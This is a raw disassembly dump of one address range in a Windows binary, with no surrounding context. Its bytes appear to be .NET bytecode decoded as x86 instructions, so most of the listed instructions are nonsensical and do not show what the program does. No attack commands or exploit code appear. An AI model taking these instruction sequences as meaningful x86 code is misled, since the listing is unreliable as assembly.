  40419c:	0a 0b                	or     (%ebx),%cl
  40419e:	07                   	pop    %es
  40419f:	20 00                	and    %al,(%eax)
  4041a1:	01 00                	add    %eax,(%eax)
  4041a3:	00 6f d2             	add    %ch,-0x2e(%edi)
  4041a6:	00 00                	add    %al,(%eax)
  4041a8:	0a 07                	or     (%edi),%al
  4041aa:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  4041b0:	d3 00                	roll   %cl,(%eax)
  4041b2:	00 0a                	add    %cl,(%edx)
  4041b4:	07                   	pop    %es
  4041b5:	17                   	pop    %ss
  4041b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4041b7:	d4 00                	aam    $0x0
  4041b9:	00 0a                	add    %cl,(%edx)
  4041bb:	07                   	pop    %es
  4041bc:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  4041bf:	00 00                	add    %al,(%eax)
  4041c1:	0a 07                	or     (%edi),%al
  4041c3:	02 7b 2a             	add    0x2a(%ebx),%bh
  4041c6:	00 00                	add    %al,(%eax)
  4041c8:	04 6f                	add    $0x6f,%al
  4041ca:	d6                   	salc
  4041cb:	00 00                	add    %al,(%eax)
  4041cd:	0a 07                	or     (%edi),%al
  4041cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d0:	d7                   	xlat   %ds:(%ebx)
  4041d1:	00 00                	add    %al,(%eax)
  4041d3:	0a 06                	or     (%esi),%al
  4041d5:	07                   	pop    %es
  4041d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d7:	d8 00                	fadds  (%eax)
  4041d9:	00 0a                	add    %cl,(%edx)
  4041db:	17                   	pop    %ss
  4041dc:	73 d9                	jae    0x4041b7
  4041de:	00 00                	add    %al,(%eax)
  4041e0:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4041e3:	07                   	pop    %es
  4041e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4041e5:	da 00                	fiaddl (%eax)
  4041e7:	00 0a                	add    %cl,(%edx)
  4041e9:	16                   	push   %ss
  4041ea:	07                   	pop    %es
  4041eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4041ec:	da 00                	fiaddl (%eax)
  4041ee:	00 0a                	add    %cl,(%edx)
  4041f0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4041f3:	4c                   	dec    %esp
  4041f4:	00 00                	add    %al,(%eax)
  4041f6:	0a 08                	or     (%eax),%cl
  4041f8:	03 16                	add    (%esi),%edx
  4041fa:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404200:	00 0a                	add    %cl,(%edx)
  404202:	08 6f db             	or     %ch,-0x25(%edi)
  404205:	00 00                	add    %al,(%eax)
  404207:	0a 02                	or     (%edx),%al
  404209:	7b 2b                	jnp    0x404236
  40420b:	00 00                	add    %al,(%eax)
  40420d:	04 73                	add    $0x73,%al
  40420f:	dc 00                	faddl  (%eax)
  404211:	00 0a                	add    %cl,(%edx)
  404213:	0d 09 06 6f dd       	or     $0xdd6f0609,%eax
  404218:	00 00                	add    %al,(%eax)
  40421a:	0a 1f                	or     (%edi),%bl
  40421c:	20 06                	and    %al,(%esi)
  40421e:	6f                   	outsl  %ds:(%esi),(%dx)
  40421f:	dd 00                	fldl   (%eax)
  404221:	00 0a                	add    %cl,(%edx)
  404223:	8e 69 1f             	mov    0x1f(%ecx),%gs
  404226:	20 59 6f             	and    %bl,0x6f(%ecx)
  404229:	de 00                	fiadds (%eax)
  40422b:	00 0a                	add    %cl,(%edx)
  40422d:	13 04 06             	adc    (%esi,%eax,1),%eax
  404230:	16                   	push   %ss
  404231:	6a 6f                	push   $0x6f
  404233:	4e                   	dec    %esi
  404234:	00 00                	add    %al,(%eax)
  404236:	0a 06                	or     (%esi),%al
  404238:	11 04 16             	adc    %eax,(%esi,%edx,1)
  40423b:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  40423e:	69 6f 4c 00 00 0a dd 	imul   $0xdd0a0000,0x4c(%edi),%ebp
  404245:	27                   	daa
  404246:	00 00                	add    %al,(%eax)
  404248:	00 09                	add    %cl,(%ecx)
  40424a:	39 06                	cmp    %eax,(%esi)
  40424c:	00 00                	add    %al,(%eax)
  40424e:	00 09                	add    %cl,(%ecx)
  404250:	6f                   	outsl  %ds:(%esi),(%dx)
  404251:	33 00                	xor    (%eax),%eax
  404253:	00 0a                	add    %cl,(%edx)
  404255:	dc 08                	fmull  (%eax)
  404257:	39 06                	cmp    %eax,(%esi)
  404259:	00 00                	add    %al,(%eax)
  40425b:	00 08                	add    %cl,(%eax)
  40425d:	6f                   	outsl  %ds:(%esi),(%dx)
  40425e:	33 00                	xor    (%eax),%eax
  404260:	00 0a                	add    %cl,(%edx)
  404262:	dc 07                	faddl  (%edi)
  404264:	39 06                	cmp    %eax,(%esi)
  404266:	00 00                	add    %al,(%eax)
  404268:	00 07                	add    %al,(%edi)
  40426a:	6f                   	outsl  %ds:(%esi),(%dx)
  40426b:	33 00                	xor    (%eax),%eax
  40426d:	00 0a                	add    %cl,(%edx)
  40426f:	dc 06                	faddl  (%esi)
  404271:	6f                   	outsl  %ds:(%esi),(%dx)
  404272:	dd 00                	fldl   (%eax)
  404274:	00 0a                	add    %cl,(%edx)
  404276:	13 05 dd 0d 00 00    	adc    0xddd,%eax
  40427c:	00 06                	add    %al,(%esi)
  40427e:	39 06                	cmp    %eax,(%esi)
  404280:	00 00                	add    %al,(%eax)
  404282:	00 06                	add    %al,(%esi)
  404284:	6f                   	outsl  %ds:(%esi),(%dx)
  404285:	33 00                	xor    (%eax),%eax
  404287:	00 0a                	add    %cl,(%edx)
  404289:	dc 11                	fcoml  (%ecx)
  40428b:	05 2a 00 00 00       	add    $0x2a,%eax
  404290:	01 34 00             	add    %esi,(%eax,%eax,1)
  404293:	00 02                	add    %al,(%edx)
  404295:	00 9c 00 35 d1 00 0d 	add    %bl,0xd00d135(%eax,%eax,1)
  40429c:	00 00                	add    %al,(%eax)
  40429e:	00 00                	add    %al,(%eax)
  4042a0:	02 00                	add    (%eax),%al
  4042a2:	6a 00                	push   $0x0
  4042a4:	74 de                	je     0x404284
  4042a6:	00 0d 00 00 00 00    	add    %cl,0x0
  4042ac:	02 00                	add    (%eax),%al
  4042ae:	26 00 c5             	es add %al,%ch
  4042b1:	eb 00                	jmp    0x4042b3
  4042b3:	0d 00 00 00 00       	or     $0x0,%eax
  4042b8:	02 00                	add    (%eax),%al
  4042ba:	17                   	pop    %ss
  4042bb:	00 ee                	add    %ch,%dh
  4042bd:	05 01 0d 00 00       	add    $0xd01,%eax
  4042c2:	00 00                	add    %al,(%eax)
  4042c4:	1b 30                	sbb    (%eax),%esi
  4042c6:	05 00 50 01 00       	add    $0x15000,%eax
  4042cb:	00 17                	add    %dl,(%edi)
  4042cd:	00 00                	add    %al,(%eax)
  4042cf:	11 03                	adc    %eax,(%ebx)
  4042d1:	3a 0b                	cmp    (%ebx),%cl
  4042d3:	00 00                	add    %al,(%eax)
  4042d5:	00 72 02             	add    %dh,0x2(%edx)
  4042d8:	29 00                	sub    %eax,(%eax)
  4042da:	70 73                	jo     0x40434f
  4042dc:	cf                   	iret
  4042dd:	00 00                	add    %al,(%eax)
  4042df:	0a 7a 03             	or     0x3(%edx),%bh
  4042e2:	73 4d                	jae    0x404331
  4042e4:	00 00                	add    %al,(%eax)
  4042e6:	0a 0a                	or     (%edx),%cl
  4042e8:	73 d1                	jae    0x4042bb
  4042ea:	00 00                	add    %al,(%eax)
  4042ec:	0a 0b                	or     (%ebx),%cl
  4042ee:	07                   	pop    %es
  4042ef:	20 00                	and    %al,(%eax)
  4042f1:	01 00                	add    %eax,(%eax)
  4042f3:	00 6f d2             	add    %ch,-0x2e(%edi)
  4042f6:	00 00                	add    %al,(%eax)
  4042f8:	0a 07                	or     (%edi),%al
  4042fa:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  404300:	d3 00                	roll   %cl,(%eax)
  404302:	00 0a                	add    %cl,(%edx)
  404304:	07                   	pop    %es
  404305:	17                   	pop    %ss
  404306:	6f                   	outsl  %ds:(%esi),(%dx)
  404307:	d4 00                	aam    $0x0
  404309:	00 0a                	add    %cl,(%edx)
  40430b:	07                   	pop    %es
  40430c:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  40430f:	00 00                	add    %al,(%eax)
  404311:	0a 07                	or     (%edi),%al
  404313:	02 7b 2a             	add    0x2a(%ebx),%bh
  404316:	00 00                	add    %al,(%eax)
  404318:	04 6f                	add    $0x6f,%al
  40431a:	d6                   	salc
  40431b:	00 00                	add    %al,(%eax)
  40431d:	0a 02                	or     (%edx),%al
  40431f:	7b 2b                	jnp    0x40434c
  404321:	00 00                	add    %al,(%eax)
  404323:	04 73                	add    $0x73,%al
  404325:	dc 00                	faddl  (%eax)
  404327:	00 0a                	add    %cl,(%edx)
  404329:	0c 08                	or     $0x8,%al
  40432b:	06                   	push   %es
  40432c:	6f                   	outsl  %ds:(%esi),(%dx)
  40432d:	dd 00                	fldl   (%eax)
  40432f:	00 0a                	add    %cl,(%edx)
  404331:	1f                   	pop    %ds
  404332:	20 06                	and    %al,(%esi)
  404334:	6f                   	outsl  %ds:(%esi),(%dx)
  404335:	dd 00                	fldl   (%eax)
  404337:	00 0a                	add    %cl,(%edx)
  404339:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40433c:	20 59 6f             	and    %bl,0x6f(%ecx)
  40433f:	de 00                	fiadds (%eax)
  404341:	00 0a                	add    %cl,(%edx)
  404343:	0d 1f 20 8d 44       	or     $0x448d201f,%eax
  404348:	00 00                	add    %al,(%eax)
  40434a:	01 13                	add    %edx,(%ebx)
  40434c:	04 06                	add    $0x6,%al
  40434e:	11 04 16             	adc    %eax,(%esi,%edx,1)
  404351:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  404354:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  40435b:	02 09                	add    (%ecx),%cl
  40435d:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  404360:	50                   	push   %eax
  404361:	00 00                	add    %al,(%eax)
  404363:	06                   	push   %es
  404364:	3a 0b                	cmp    (%ebx),%cl
  404366:	00 00                	add    %al,(%eax)
  404368:	00 72 30             	add    %dh,0x30(%edx)
  40436b:	29 00                	sub    %eax,(%eax)
  40436d:	70 73                	jo     0x4043e2
  40436f:	df 00                	filds  (%eax)
  404371:	00 0a                	add    %cl,(%edx)
  404373:	7a dd                	jp     0x404352
  404375:	0d 00 00 00 08       	or     $0x8000000,%eax
  40437a:	39 06                	cmp    %eax,(%esi)
  40437c:	00 00                	add    %al,(%eax)
  40437e:	00 08                	add    %cl,(%eax)
  404380:	6f                   	outsl  %ds:(%esi),(%dx)
  404381:	33 00                	xor    (%eax),%eax
  404383:	00 0a                	add    %cl,(%edx)
  404385:	dc 1f                	fcompl (%edi)
  404387:	10 8d 44 00 00 01    	adc    %cl,0x1000044(%ebp)
  40438d:	13 05 06 11 05 16    	adc    0x16051106,%eax
  404393:	1f                   	pop    %ds
  404394:	10 6f 45             	adc    %ch,0x45(%edi)
  404397:	00 00                	add    %al,(%eax)
  404399:	0a 26                	or     (%esi),%ah
  40439b:	07                   	pop    %es
  40439c:	11 05 6f e0 00 00    	adc    %eax,0xe06f
  4043a2:	0a 06                	or     (%esi),%al
  4043a4:	07                   	pop    %es
  4043a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4043a6:	e1 00                	loope  0x4043a8
  4043a8:	00 0a                	add    %cl,(%edx)
  4043aa:	16                   	push   %ss
  4043ab:	73 d9                	jae    0x404386
  4043ad:	00 00                	add    %al,(%eax)
  4043af:	0a 13                	or     (%ebx),%dl
  4043b1:	06                   	push   %es
  4043b2:	06                   	push   %es
  4043b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4043b4:	e2 00                	loop   0x4043b6
  4043b6:	00 0a                	add    %cl,(%edx)
  4043b8:	1f                   	pop    %ds
  4043b9:	10 6a 59             	adc    %ch,0x59(%edx)
  4043bc:	17                   	pop    %ss
  4043bd:	6a 58                	push   $0x58
  4043bf:	d4 8d                	aam    $0x8d
  4043c1:	44                   	inc    %esp
  4043c2:	00 00                	add    %al,(%eax)
  4043c4:	01 13                	add    %edx,(%ebx)
  4043c6:	07                   	pop    %es
  4043c7:	11 06                	adc    %eax,(%esi)
  4043c9:	11 07                	adc    %eax,(%edi)
  4043cb:	16                   	push   %ss
  4043cc:	11 07                	adc    %eax,(%edi)
  4043ce:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4043d1:	45                   	inc    %ebp
  4043d2:	00 00                	add    %al,(%eax)
  4043d4:	0a 8d 44 00 00 01    	or     0x1000044(%ebp),%cl
  4043da:	13 08                	adc    (%eax),%ecx
  4043dc:	11 07                	adc    %eax,(%edi)
  4043de:	16                   	push   %ss
  4043df:	11 08                	adc    %ecx,(%eax)
  4043e1:	16                   	push   %ss
  4043e2:	11 08                	adc    %ecx,(%eax)
  4043e4:	8e 69 28             	mov    0x28(%ecx),%gs
  4043e7:	e3 00                	jecxz  0x4043e9
  4043e9:	00 0a                	add    %cl,(%edx)
  4043eb:	11 08                	adc    %ecx,(%eax)
  4043ed:	13 09                	adc    (%ecx),%ecx
  4043ef:	dd 29                	(bad) (%ecx)
  4043f1:	00 00                	add    %al,(%eax)
  4043f3:	00 11                	add    %dl,(%ecx)
  4043f5:	06                   	push   %es
  4043f6:	39 07                	cmp    %eax,(%edi)
  4043f8:	00 00                	add    %al,(%eax)
  4043fa:	00 11                	add    %dl,(%ecx)
  4043fc:	06                   	push   %es
  4043fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4043fe:	33 00                	xor    (%eax),%eax
  404400:	00 0a                	add    %cl,(%edx)
  404402:	dc 07                	faddl  (%edi)
  404404:	39 06                	cmp    %eax,(%esi)
  404406:	00 00                	add    %al,(%eax)
  404408:	00 07                	add    %al,(%edi)
  40440a:	6f                   	outsl  %ds:(%esi),(%dx)
  40440b:	33 00                	xor    (%eax),%eax
  40440d:	00 0a                	add    %cl,(%edx)
  40440f:	dc 06                	faddl  (%esi)
  404411:	39 06                	cmp    %eax,(%esi)
  404413:	00 00                	add    %al,(%eax)
  404415:	00 06                	add    %al,(%esi)
  404417:	6f                   	outsl  %ds:(%esi),(%dx)
  404418:	33 00                	xor    (%eax),%eax
  40441a:	00 0a                	add    %cl,(%edx)
  40441c:	dc 11                	fcoml  (%ecx)
  40441e:	09 2a                	or     %ebp,(%edx)
  404420:	41                   	inc    %ecx
  404421:	64 00 00             	add    %al,%fs:(%eax)
  404424:	02 00                	add    (%eax),%al
  404426:	00 00                	add    %al,(%eax)
  404428:	5a                   	pop    %edx
  404429:	00 00                	add    %al,(%eax)
  40442b:	00 4f 00             	add    %cl,0x0(%edi)
  40442e:	00 00                	add    %al,(%eax)
  404430:	a9 00 00 00 0d       	test   $0xd000000,%eax
  404435:	00 00                	add    %al,(%eax)
  404437:	00 00                	add    %al,(%eax)
  404439:	00 00                	add    %al,(%eax)
  40443b:	00 02                	add    %al,(%edx)
  40443d:	00 00                	add    %al,(%eax)
  40443f:	00 e2                	add    %ah,%dl
  404441:	00 00                	add    %al,(%eax)
  404443:	00 42 00             	add    %al,0x0(%edx)
  404446:	00 00                	add    %al,(%eax)
  404448:	24 01                	and    $0x1,%al
  40444a:	00 00                	add    %al,(%eax)
  40444c:	0f 00 00             	sldt   (%eax)
  40444f:	00 00                	add    %al,(%eax)
  404451:	00 00                	add    %al,(%eax)
  404453:	00 02                	add    %al,(%edx)
  404455:	00 00                	add    %al,(%eax)
  404457:	00 1e                	add    %bl,(%esi)
  404459:	00 00                	add    %al,(%eax)
  40445b:	00 15 01 00 00 33    	add    %dl,0x33000001
  404461:	01 00                	add    %eax,(%eax)
  404463:	00 0d 00 00 00 00    	add    %cl,0x0
  404469:	00 00                	add    %al,(%eax)
  40446b:	00 02                	add    %al,(%edx)
  40446d:	00 00                	add    %al,(%eax)
  40446f:	00 18                	add    %bl,(%eax)
  404471:	00 00                	add    %al,(%eax)
  404473:	00 28                	add    %ch,(%eax)
  404475:	01 00                	add    %eax,(%eax)
  404477:	00 40 01             	add    %al,0x1(%eax)
  40447a:	00 00                	add    %al,(%eax)
  40447c:	0d 00 00 00 00       	or     $0x0,%eax
  404481:	00 00                	add    %al,(%eax)
  404483:	00 13                	add    %dl,(%ebx)
  404485:	30 03                	xor    %al,(%ebx)
  404487:	00 22                	add    %ah,(%edx)
  404489:	00 00                	add    %al,(%eax)
  40448b:	00 18                	add    %bl,(%eax)
  40448d:	00 00                	add    %al,(%eax)
  40448f:	11 17                	adc    %edx,(%edi)
  404491:	0a 16                	or     (%esi),%dl
  404493:	0b 38                	or     (%eax),%edi
  404495:	11 00                	adc    %eax,(%eax)
  404497:	00 00                	add    %al,(%eax)
  404499:	03 07                	add    (%edi),%eax
  40449b:	91                   	xchg   %eax,%ecx
  40449c:	04 07                	add    $0x7,%al
  40449e:	91                   	xchg   %eax,%ecx
  40449f:	3b 02                	cmp    (%edx),%eax
  4044a1:	00 00                	add    %al,(%eax)
  4044a3:	00 16                	add    %dl,(%esi)
  4044a5:	0a 07                	or     (%edi),%al
  4044a7:	17                   	pop    %ss
  4044a8:	58                   	pop    %eax
  4044a9:	0b 07                	or     (%edi),%eax
  4044ab:	03 8e 69 32 e9 06    	add    0x6e93269(%esi),%ecx
  4044b1:	2a 00                	sub    (%eax),%al
  4044b3:	00 1b                	add    %bl,(%ebx)
  4044b5:	30 03                	xor    %al,(%ebx)
  4044b7:	00 6e 00             	add    %ch,0x0(%esi)
  4044ba:	00 00                	add    %al,(%eax)
  4044bc:	19 00                	sbb    %eax,(%eax)
  4044be:	00 11                	add    %dl,(%ecx)
  4044c0:	28 19                	sub    %bl,(%ecx)
  4044c2:	00 00                	add    %al,(%eax)
  4044c4:	0a 02                	or     (%edx),%al
  4044c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4044c7:	1f                   	pop    %ds
  4044c8:	00 00                	add    %al,(%eax)
  4044ca:	0a 0a                	or     (%edx),%cl
  4044cc:	73 e5                	jae    0x4044b3
  4044ce:	00 00                	add    %al,(%eax)
  4044d0:	0a 0b                	or     (%ebx),%cl
  4044d2:	07                   	pop    %es
  4044d3:	06                   	push   %es
  4044d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4044d5:	8f 00                	pop    (%eax)
  4044d7:	00 0a                	add    %cl,(%edx)
  4044d9:	0a dd                	or     %ch,%bl
  4044db:	0d 00 00 00 07       	or     $0x7000000,%eax
  4044e0:	39 06                	cmp    %eax,(%esi)
  4044e2:	00 00                	add    %al,(%eax)
  4044e4:	00 07                	add    %al,(%edi)
  4044e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4044e7:	33 00                	xor    (%eax),%eax
  4044e9:	00 0a                	add    %cl,(%edx)
  4044eb:	dc 73 90             	fdivl  -0x70(%ebx)
  4044ee:	00 00                	add    %al,(%eax)
  4044f0:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4044f3:	0d 16 13 04 38       	or     $0x38041316,%eax
  4044f8:	1f                   	pop    %ds
  4044f9:	00 00                	add    %al,(%eax)
  4044fb:	00 09                	add    %cl,(%ecx)
  4044fd:	11 04 91             	adc    %eax,(%ecx,%edx,4)
  404500:	13 05 08 12 05 72    	adc    0x72051208,%eax
  404506:	86 29                	xchg   %ch,(%ecx)
  404508:	00 70 28             	add    %dh,0x28(%eax)
  40450b:	91                   	xchg   %eax,%ecx
  40450c:	00 00                	add    %al,(%eax)
  40450e:	0a 6f 92             	or     -0x6e(%edi),%ch
  404511:	00 00                	add    %al,(%eax)
  404513:	0a 26                	or     (%esi),%ah
  404515:	11 04 17             	adc    %eax,(%edi,%edx,1)
  404518:	58                   	pop    %eax
  404519:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40451c:	04 09                	add    $0x9,%al
  40451e:	8e 69 32             	mov    0x32(%ecx),%gs
  404521:	da 08                	fimull (%eax)
  404523:	6f                   	outsl  %ds:(%esi),(%dx)
  404524:	38 00                	cmp    %al,(%eax)
  404526:	00 0a                	add    %cl,(%edx)
  404528:	6f                   	outsl  %ds:(%esi),(%dx)
  404529:	94                   	xchg   %eax,%esp
  40452a:	00 00                	add    %al,(%eax)
  40452c:	0a 2a                	or     (%edx),%ch
  40452e:	00 00                	add    %al,(%eax)
  404530:	01 10                	add    %edx,(%eax)
  404532:	00 00                	add    %al,(%eax)
  404534:	02 00                	add    (%eax),%al
  404536:	12 00                	adc    (%eax),%al
  404538:	0d 1f 00 0d 00       	or     $0xd001f,%eax
  40453d:	00 00                	add    %al,(%eax)
  40453f:	00 1b                	add    %bl,(%ebx)
  404541:	30 02                	xor    %al,(%edx)
  404543:	00 22                	add    %ah,(%edx)
  404545:	00 00                	add    %al,(%eax)
  404547:	00 1a                	add    %bl,(%edx)
  404549:	00 00                	add    %al,(%eax)
  40454b:	11 73 e5             	adc    %esi,-0x1b(%ebx)
  40454e:	00 00                	add    %al,(%eax)
  404550:	0a 0a                	or     (%edx),%cl
  404552:	06                   	push   %es
  404553:	02 6f 8f             	add    -0x71(%edi),%ch
  404556:	00 00                	add    %al,(%eax)
  404558:	0a 0b                	or     (%ebx),%cl
  40455a:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  404560:	39 06                	cmp    %eax,(%esi)
  404562:	00 00                	add    %al,(%eax)
  404564:	00 06                	add    %al,(%esi)
  404566:	6f                   	outsl  %ds:(%esi),(%dx)
  404567:	33 00                	xor    (%eax),%eax
  404569:	00 0a                	add    %cl,(%edx)
  40456b:	dc 07                	faddl  (%edi)
  40456d:	2a 00                	sub    (%eax),%al
  40456f:	00 01                	add    %al,(%ecx)
  404571:	10 00                	adc    %al,(%eax)
  404573:	00 02                	add    %al,(%edx)
  404575:	00 06                	add    %al,(%esi)
  404577:	00 0d 13 00 0d 00    	add    %cl,0xd0013
  40457d:	00 00                	add    %al,(%eax)
  40457f:	00 13                	add    %dl,(%ebx)
  404581:	30 03                	xor    %al,(%ebx)
  404583:	00 3b                	add    %bh,(%ebx)
  404585:	00 00                	add    %al,(%eax)
  404587:	00 1b                	add    %bl,(%ebx)
  404589:	00 00                	add    %al,(%eax)
  40458b:	11 73 90             	adc    %esi,-0x70(%ebx)
  40458e:	00 00                	add    %al,(%eax)
  404590:	0a 0a                	or     (%edx),%cl
  404592:	02 0b                	add    (%ebx),%cl
  404594:	16                   	push   %ss
  404595:	0c 38                	or     $0x38,%al
  404597:	1f                   	pop    %ds
  404598:	00 00                	add    %al,(%eax)
  40459a:	00 07                	add    %al,(%edi)
  40459c:	08 91 0d 06 72 8c    	or     %dl,-0x738df9f3(%ecx)
  4045a2:	29 00                	sub    %eax,(%eax)
  4045a4:	70 09                	jo     0x4045af
  4045a6:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045aa:	01 28                	add    %ebp,(%eax)
  4045ac:	e6 00                	out    %al,$0x0
  4045ae:	00 0a                	add    %cl,(%edx)
  4045b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b1:	92                   	xchg   %eax,%edx
  4045b2:	00 00                	add    %al,(%eax)
  4045b4:	0a 26                	or     (%esi),%ah
  4045b6:	08 17                	or     %dl,(%edi)
  4045b8:	58                   	pop    %eax
  4045b9:	0c 08                	or     $0x8,%al
  4045bb:	07                   	pop    %es
  4045bc:	8e 69 32             	mov    0x32(%ecx),%gs
  4045bf:	db 06                	fildl  (%esi)
  4045c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4045c2:	38 00                	cmp    %al,(%eax)
  4045c4:	00 0a                	add    %cl,(%edx)
  4045c6:	2a 00                	sub    (%eax),%al
  4045c8:	13 30                	adc    (%eax),%esi
  4045ca:	03 00                	add    (%eax),%eax
  4045cc:	3b 00                	cmp    (%eax),%eax
  4045ce:	00 00                	add    %al,(%eax)
  4045d0:	1b 00                	sbb    (%eax),%eax
  4045d2:	00 11                	add    %dl,(%ecx)
  4045d4:	73 90                	jae    0x404566
  4045d6:	00 00                	add    %al,(%eax)
  4045d8:	0a 0a                	or     (%edx),%cl
  4045da:	02 0b                	add    (%ebx),%cl
  4045dc:	16                   	push   %ss
  4045dd:	0c 38                	or     $0x38,%al
  4045df:	1f                   	pop    %ds
  4045e0:	00 00                	add    %al,(%eax)
  4045e2:	00 07                	add    %al,(%edi)
  4045e4:	08 91 0d 06 72 9c    	or     %dl,-0x638df9f3(%ecx)
  4045ea:	29 00                	sub    %eax,(%eax)
  4045ec:	70 09                	jo     0x4045f7
  4045ee:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045f2:	01 28                	add    %ebp,(%eax)
  4045f4:	e6 00                	out    %al,$0x0
  4045f6:	00 0a                	add    %cl,(%edx)
  4045f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045f9:	92                   	xchg   %eax,%edx
  4045fa:	00 00                	add    %al,(%eax)
  4045fc:	0a 26                	or     (%esi),%ah
  4045fe:	08 17                	or     %dl,(%edi)
  404600:	58                   	pop    %eax
  404601:	0c 08                	or     $0x8,%al
  404603:	07                   	pop    %es
  404604:	8e 69 32             	mov    0x32(%ecx),%gs
  404607:	db 06                	fildl  (%esi)
  404609:	6f                   	outsl  %ds:(%esi),(%dx)
  40460a:	38 00                	cmp    %al,(%eax)
  40460c:	00 0a                	add    %cl,(%edx)
  40460e:	2a 00                	sub    (%eax),%al
  404610:	13 30                	adc    (%eax),%esi
  404612:	04 00                	add    $0x0,%al
  404614:	2c 00                	sub    $0x0,%al
  404616:	00 00                	add    %al,(%eax)
  404618:	1c 00                	sbb    $0x0,%al
  40461a:	00 11                	add    %dl,(%ecx)
  40461c:	02 8e 69 8d 44 00    	add    0x448d69(%esi),%cl
  404622:	00 01                	add    %al,(%ecx)
  404624:	0a 02                	or     (%edx),%al
  404626:	8e 69 17             	mov    0x17(%ecx),%gs
  404629:	59                   	pop    %ecx
  40462a:	0b 16                	or     (%esi),%edx
  40462c:	0c 38                	or     $0x38,%al
  40462e:	0e                   	push   %cs
  40462f:	00 00                	add    %al,(%eax)
  404631:	00 06                	add    %al,(%esi)
  404633:	08 02                	or     %al,(%edx)
  404635:	07                   	pop    %es
  404636:	91                   	xchg   %eax,%ecx
  404637:	9c                   	pushf
  404638:	07                   	pop    %es
  404639:	17                   	pop    %ss
  40463a:	59                   	pop    %ecx
  40463b:	0b 08                	or     (%eax),%ecx
  40463d:	17                   	pop    %ss
  40463e:	58                   	pop    %eax
  40463f:	0c 08                	or     $0x8,%al
  404641:	06                   	push   %es
  404642:	8e 69 32             	mov    0x32(%ecx),%gs
  404645:	ec                   	in     (%dx),%al
  404646:	06                   	push   %es
  404647:	2a 13                	sub    (%ebx),%dl
  404649:	30 02                	xor    %al,(%edx)
  40464b:	00 36                	add    %dh,(%esi)
  40464d:	00 00                	add    %al,(%eax)
  40464f:	00 01                	add    %al,(%ecx)
  404651:	00 00                	add    %al,(%eax)
  404653:	11 16                	adc    %edx,(%esi)
  404655:	0a 38                	or     (%eax),%bh
  404657:	15 00 00 00 02       	adc    $0x2000000,%eax
  40465c:	7b 38                	jnp    0x404696
  40465e:	00 00                	add    %al,(%eax)
  404660:	04 06                	add    $0x6,%al
  404662:	6f                   	outsl  %ds:(%esi),(%dx)
  404663:	ea 00 00 0a 6f 6b 00 	ljmp   $0x6b,$0x6f0a0000
  40466a:	00 06                	add    %al,(%esi)
  40466c:	06                   	push   %es
  40466d:	17                   	pop    %ss
  40466e:	58                   	pop    %eax
  40466f:	0a 06                	or     (%esi),%al
  404671:	02 7b 38             	add    0x38(%ebx),%bh
  404674:	00 00                	add    %al,(%eax)
  404676:	04 6f                	add    $0x6f,%al
  404678:	eb 00                	jmp    0x40467a
  40467a:	00 0a                	add    %cl,(%edx)
  40467c:	32 dd                	xor    %ch,%bl
  40467e:	02 7b 38             	add    0x38(%ebx),%bh
  404681:	00 00                	add    %al,(%eax)
  404683:	04 6f                	add    $0x6f,%al
  404685:	ec                   	in     (%dx),%al
  404686:	00 00                	add    %al,(%eax)
  404688:	0a 2a                	or     (%edx),%ch
  40468a:	00 00                	add    %al,(%eax)
  40468c:	13 30                	adc    (%eax),%esi
  40468e:	02 00                	add    (%eax),%al
  404690:	1b 00                	sbb    (%eax),%eax
  404692:	00 00                	add    %al,(%eax)
  404694:	1d 00 00 11 73       	sbb    $0x73110000,%eax
  404699:	94                   	xchg   %eax,%esp
  40469a:	00 00                	add    %al,(%eax)
  40469c:	06                   	push   %es
  40469d:	0a 06                	or     (%esi),%al
  40469f:	02 7d 37             	add    0x37(%ebp),%bh
  4046a2:	00 00                	add    %al,(%eax)
  4046a4:	04 02                	add    $0x2,%al
  4046a6:	7b 38                	jnp    0x4046e0
  4046a8:	00 00                	add    %al,(%eax)
  4046aa:	04 06                	add    $0x6,%al
  4046ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4046ad:	b9 00 00 0a 06       	mov    $0x60a0000,%ecx
  4046b2:	2a 00                	sub    (%eax),%al
  4046b4:	1b 30                	sbb    (%eax),%esi
  4046b6:	02 00                	add    (%eax),%al
  4046b8:	60                   	pusha
  4046b9:	00 00                	add    %al,(%eax)
  4046bb:	00 1e                	add    %bl,(%esi)
  4046bd:	00 00                	add    %al,(%eax)
  4046bf:	11 15 0a 15 0b 03    	adc    %edx,0x30b150a
  4046c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4046c6:	7d 00                	jge    0x4046c8
  4046c8:	00 0a                	add    %cl,(%edx)
  4046ca:	0c 02                	or     $0x2,%al
  4046cc:	7b 38                	jnp    0x404706
  4046ce:	00 00                	add    %al,(%eax)
  4046d0:	04 6f                	add    $0x6f,%al
  4046d2:	bb 00 00 0a 0d       	mov    $0xd0a0000,%ebx
  4046d7:	38 26                	cmp    %ah,(%esi)
